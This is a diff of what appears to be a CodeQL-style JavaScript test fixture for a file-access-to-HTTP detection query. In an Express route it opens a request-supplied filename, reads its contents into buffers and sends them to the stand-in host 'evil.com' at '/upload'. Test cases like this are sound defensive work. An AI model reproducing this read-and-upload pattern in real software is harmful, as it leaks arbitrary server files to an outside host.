@@ -29,10 +29,10 @@ const fsp = require("fs").promises;
 
 app.post('/readv', async (req, res) => {
   const { filename } = req.body;
-  const fd = await fs.open(filename, 'r'); 
+  const fd = await fsp.open(filename, 'r'); 
 
   const buffer = [Buffer.alloc(1024), Buffer.alloc(1024)]; // $ Source[js/file-access-to-http]
-  const { bytesRead } = fs.readvSync(fd, buffer); 
+  const bytesRead = fs.readvSync(fd, buffer); 
   https.get({
     hostname: "evil.com",
     path: "/upload",
@@ -41,7 +41,7 @@ app.post('/readv', async (req, res) => {
   }, () => { }); // $ Alert[js/file-access-to-http]
 
   const buffer1 = Buffer.alloc(1024); // $ Source[js/file-access-to-http]
-  const { bytesRead1 } = fs.readvSync(fd, [buffer1]); 
+  const bytesRead1 = fs.readvSync(fd, [buffer1]); 
   https.get({
     hostname: "evil.com",
     path: "/upload",
